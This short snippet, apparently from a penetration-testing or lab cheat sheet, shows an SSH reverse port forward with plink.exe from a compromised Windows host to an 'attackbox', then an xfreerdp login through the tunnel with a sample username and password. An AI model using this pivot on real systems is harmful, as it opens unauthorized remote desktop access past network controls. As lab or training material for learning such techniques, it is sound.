
```powershell
# Plink reomte port forward syntax:
C:\Windows\Temp\plink.exe -ssh -l <attackbox-username> -pw <attackbox-password> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4 # IP of attackbox

# Now we can RDP to the server like this:
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```